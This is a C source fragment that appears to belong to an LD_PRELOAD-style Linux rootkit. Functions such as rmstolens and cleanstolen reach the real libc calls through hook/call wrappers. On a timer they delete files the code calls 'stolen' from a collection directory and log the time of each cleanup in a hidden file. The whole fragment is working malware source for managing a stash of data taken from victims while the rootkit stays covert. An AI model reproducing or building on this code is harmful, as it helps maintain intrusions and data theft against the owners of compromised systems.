void rmstolens(void){
    DIR *dp;
    struct dirent *dir;
    size_t pathlen;

    hook(COPENDIR, CREADDIR, CUNLINK);

    dp = call(COPENDIR, INTEREST_DIR);
    if(dp == NULL) return;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        pathlen = strlen(INTEREST_DIR) + strlen(dir->d_name) + 2;
        if(pathlen>PATH_MAX) continue;

        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", INTEREST_DIR, dir->d_name);
        call(CUNLINK, path);
    }
    closedir(dp);
}

FILE *opencleanedtimepath(const char *mode){
    hook(CFOPEN);
    return call(CFOPEN, CLEANEDTIME_PATH, mode);
}

int getlastclean(void){
    int currentlast;
    FILE *fp;
    char timbuf[64];

    fp = opencleanedtimepath("r");
    if(fp == NULL){
        writelastclean(time(NULL));
        return getlastclean();
    }
    fgets(timbuf, sizeof(timbuf), fp);
    fclose(fp);

    currentlast = atoi(timbuf);
    return currentlast;
}

void writelastclean(int curtime){
    FILE *fp;
    char timbuf[64];

    fp = opencleanedtimepath("w");
    if(fp == NULL) return;

    snprintf(timbuf, sizeof(timbuf), "%d", curtime);
    hook(CFWRITE);
    call(CFWRITE, timbuf, 1, strlen(timbuf), fp);
    fclose(fp);
}

int getlastcleandiff(int curtime){
    int lastclean = getlastclean();
    int diff = curtime - lastclean;
    return diff;
}

void cleanstolen(void){
    if(not_user(0) || rknomore())
        return;

    int curtime = time(NULL);
    if(getlastcleandiff(curtime) <= FILE_CLEANSE_TIMER)
        return;

    rmstolens();
    writelastclean(curtime);
}